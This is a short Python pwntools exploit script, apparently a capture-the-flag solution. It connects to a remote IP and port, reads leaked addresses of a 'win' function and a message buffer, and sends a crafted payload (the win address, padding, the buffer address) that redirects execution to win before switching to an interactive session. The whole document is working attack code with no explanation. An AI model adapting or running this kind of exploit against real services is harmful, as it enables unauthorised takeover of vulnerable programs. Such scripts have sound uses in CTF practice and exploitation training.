from pwn import *

p = remote("34.170.146.252", 44436)

p.recvuntil(b"<win> = 0x")
win_addr = int(p.recvline().strip(), 16)
log.info(hex(win_addr))

p.sendlineafter(b"> ", b"3")
message_addr = int(p.recvuntil(b"<--").strip()[-40:-25], 16)
log.info(hex(message_addr))

payload = p64(win_addr) + b"a"*0x18 + p64(message_addr)
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"Message: ", payload)

p.sendlineafter(b"> ", b"3")
print(p.recvuntil(b"> "))

p.sendline(b"1")

p.interactive()
